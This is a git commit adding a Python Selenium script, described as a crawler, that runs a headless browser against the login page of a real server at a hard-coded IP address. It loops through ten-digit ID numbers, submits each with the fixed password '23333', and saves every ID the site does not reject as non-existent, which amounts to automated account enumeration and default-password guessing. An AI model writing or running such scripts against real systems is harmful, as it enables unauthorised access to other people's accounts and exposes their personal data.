2eb8b18d98a913a8b8fd2da8ea0846d33cd841b5
Amor <274310994@qq.com>
2019-04-10 20:53:34 +0800

    增加阿里云服务器爬虫脚本

---
+++ jiaogonghao-tn.py
@@ -0,0 +1,41 @@
+# -*- coding: utf-8 -*-
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+
+
+def spider():
+    chrome_options = Options()
+    chrome_options.add_argument('--headless')
+    chrome_options.add_argument('--disable-gpu')  # 上面三行代码就是为了将Chrome不弹出界面，实现无界面爬取
+    browser = webdriver.Chrome(chrome_options=chrome_options)
+    browser.get('http://60.219.165.24')
+    lastid = open('lastid.txt', 'r+')
+    passid = open('passid.txt', 'a+')
+    try:
+        for i in range(int(lastid.read()[-10:]), 2016026399):
+            username = browser.find_element_by_name('zjh')
+            username.send_keys(i)
+            username = browser.find_element_by_name('mm')
+            username.send_keys('23333')
+            btn = browser.find_element_by_id('btnSure')
+            btn.click()
+            message = browser.find_elements_by_xpath(
+                '//td[@class="errorTop"]')[0].text
+            if message == "你输入的证件号不存在，请您重新输入！":
+                print('未通过：' + str(i))
+                lastid.write(str(i))
+                continue
+            else:
+                print(i)
+                lastid.write(str(i))
+                passid.write(str(i) + '\n')
+    finally:
+        browser.close()
+        ld = lastid.read()[-10:]
+        lastid1 = open('lastid.txt', 'w')
+        lastid1.write(ld)
+        lastid.close()
+        lastid1.close()
+        passid.close()
+
+spider()
